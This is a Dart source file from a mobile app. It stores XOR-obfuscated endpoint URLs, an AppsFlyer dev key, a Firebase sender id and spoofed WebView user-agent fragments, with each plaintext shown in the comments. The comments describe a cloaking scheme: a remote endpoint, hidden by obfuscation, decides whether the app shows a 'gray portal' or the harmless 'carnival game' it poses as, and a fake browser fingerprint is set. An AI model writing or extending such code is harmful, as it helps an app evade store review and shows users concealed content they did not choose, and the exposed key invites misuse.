import '../cipher/weaver.dart';

// ---------------------------------------------------------------
// Mask bytes — shielded portal endpoints
// ---------------------------------------------------------------
// Each `_` prefixed const list holds the XOR-keystream output of the
// matching plaintext. Empty arrays mean the credential has not
// landed yet — the portal will degrade to the native game path.
//
// Regeneration: change the seed / length in
// lib/cipher/weaver.dart and tool/pack_ciphers.dart together, then:
//   dart run tool/pack_ciphers.dart
// and paste the printed arrays back into this file.
// ---------------------------------------------------------------

/// POST endpoint that decides gray portal vs native carnival game.
/// Plaintext: "https://jokersttreet.com/config.php"
const List<int> _portalGate = <int>[
  135, 95, 129, 99, 65, 152, 23, 43, 119, 230, 224, 117, 181, 100, 160, 165,
  184, 86, 34, 173, 13, 204, 243, 66, 199, 2, 135, 25, 197, 1, 163, 44, 191,
  99, 165,
];

/// GCD base URL used by the organic-false-positive attribution retry.
/// Plaintext: "https://gcdsdk.appsflyer.com/install_data/v4.0/"
const List<int> _gcdBase = <int>[
  135, 95, 129, 99, 65, 152, 23, 43, 122, 234, 239, 99, 163, 124, 250, 176,
  186, 67, 52, 191, 79, 214, 249, 93, 198, 2, 135, 26, 140, 1, 170, 113, 187,
  106, 185, 95, 77, 230, 121, 80, 92, 134, 221, 4, 201, 7, 219,
];

/// Chrome build/patch fragment for the spoofed WebView user-agent.
/// Plaintext: "149.0.7813.127"
const List<int> _chromeFingerprint = <int>[
  222, 31, 204, 61, 2, 140, 15, 60, 44, 186, 165, 33, 245, 32,
];

/// WebKit build fragment for the spoofed WebView user-agent.
/// Plaintext: "537.36"
const List<int> _webkitFingerprint = <int>[
  218, 24, 194, 61, 1, 148,
];

/// AppsFlyer Dev Key.
/// Plaintext: "AybqpvKFmB5U5mB2UzR83G"
const List<int> _adSpotterKey = <int>[
  174, 82, 151, 98, 66, 212, 115, 66, 112, 203, 190, 69, 242, 122, 150, 227,
  159, 73, 21, 225, 16, 232,
];

/// Firebase project number / sender id.
/// Plaintext: "734686002392"
const List<int> _messagingRef = <int>[
  216, 24, 193, 37, 10, 148, 8, 52, 47, 186, 178, 34,
];

/// POST endpoint that decides gray portal vs native carnival game.
String unveilPortalGate() => unshield(_portalGate);

/// AppsFlyer Dev Key. Empty until the manager provides one.
String unveilAdSpotterKey() => unshield(_adSpotterKey);

/// Firebase project number / sender id. Empty until Firebase is wired.
String unveilMessagingRef() => unshield(_messagingRef);

/// Chrome build/patch fragment for the spoofed WebView user-agent.
String unveilChromeFingerprint() => unshield(_chromeFingerprint);

/// WebKit build fragment for the spoofed WebView user-agent.
String unveilWebkitFingerprint() => unshield(_webkitFingerprint);

/// Builds the GCD (Get Conversion Data) retry URL. Returns "" if the
/// base URL is not yet encoded — callers must treat "" as "GCD retry
/// unavailable, use whatever attribution the SDK already delivered".
String unveilGcdUrl(String appId, String deviceId) {
  final String base = unshield(_gcdBase);
  if (base.isEmpty) return '';
  return '$base$appId?devkey=${unveilAdSpotterKey()}&device_id=$deviceId';
}
